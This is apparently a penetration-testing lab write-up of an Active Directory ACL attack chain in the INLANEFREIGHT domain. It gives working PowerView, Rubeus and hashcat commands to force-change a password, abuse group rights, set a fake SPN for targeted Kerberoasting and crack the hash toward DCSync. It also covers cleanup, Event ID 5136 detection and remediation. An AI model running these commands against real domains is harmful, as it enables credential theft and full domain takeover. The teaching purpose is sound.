## Attack Chain Overview

**Starting position:** Control of `wley` (cracked NTLMv2 hash via Responder)
**Goal:** Reach `adunn` (can perform DCSync → full domain compromise)

**Chain:**
1. `wley` → force-change password of `damundsen` (ForceChangePassword right)
2. `damundsen` → add to `Help Desk Level 1` group (GenericWrite on group)
3. Inherit nested group membership → `Information Technology` group
4. `IT group` → GenericAll over `adunn` → targeted Kerberoast → crack hash → DCSync

---

## Step 1 — Force-Change damundsen's Password (as wley)

### Create PSCredential object for wley
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

### Create new password SecureString
```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

### Force-change damundsen's password using PowerView
```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

---

## Step 2 — Add damundsen to Help Desk Level 1 (as damundsen)

### Create PSCredential for damundsen
```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

### Confirm current group membership (baseline)
```powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

### Add damundsen to the group
```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

### Confirm addition
```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

---

## Step 3 — Targeted Kerberoasting of adunn (via GenericAll)

Now authenticated as damundsen (member of Help Desk Level 1 → nested into IT group → GenericAll over adunn).

> If modifying adunn's password isn't permitted (e.g. it's an admin account), use **targeted Kerberoasting** instead — add a fake SPN to the account, request the TGS, crack it offline. Linux alternative: [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) (handles SPN creation, retrieval, and cleanup automatically).

### Create a fake SPN on adunn
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

### Kerberoast the account with Rubeus
```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```
→ Retrieves RC4 TGS hash for offline cracking.

### Crack offline with Hashcat
```bash
hashcat -m 13100 adunn_hash /usr/share/wordlists/rockyou.txt
```

---

## Cleanup (in order — do NOT remove from group first)

Cleanup order matters: remove fake SPN before leaving the group, or you'll lose the rights needed to clean up.

### 1. Remove the fake SPN from adunn
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

### 2. Remove damundsen from Help Desk Level 1
```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

### 3. Confirm removal
```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | ? {$_.MemberName -eq 'damundsen'}
```

### 4. Reset damundsen's password (if original is known) or alert client

> Document **every** modification in the final report regardless of cleanup success.

---

## Detection & Remediation

### ACL Monitoring
- Enable **Advanced Security Audit Policy**
- **Event ID 5136** — "A directory service object was modified" — fires on ACL changes to domain objects

### Reading SDDL from Event Logs
Event ID 5136 details are written in SDDL (not human-readable). Convert:
```powershell
ConvertFrom-SddlString "<SDDL string>"
# Filter for DiscretionaryAcl
ConvertFrom-SddlString "<SDDL string>" | select -ExpandProperty DiscretionaryAcl
```
Look for unexpected accounts with `GenericWrite`, `GenericAll`, or `WriteOwner` permissions on sensitive objects.

### Remediation Steps
- **Regularly audit and remove dangerous ACLs** — use BloodHound to identify attack paths and train internal staff to do the same.
- **Monitor important group memberships** — alert on changes to high-impact groups (Domain Admins, IT, Help Desk, etc.).
- **Alert on Event ID 5136** — unexpected modifications to AD objects.
- Use BloodHound to proactively identify and remove dangerous ACL chains before attackers find them.

---

## Key Takeaway
ACL attack chains can be subtle and multi-step — no single event screams "attack." BloodHound is essential for visualizing these chains. Always document, always clean up in the correct order, and always communicate modifications to the client.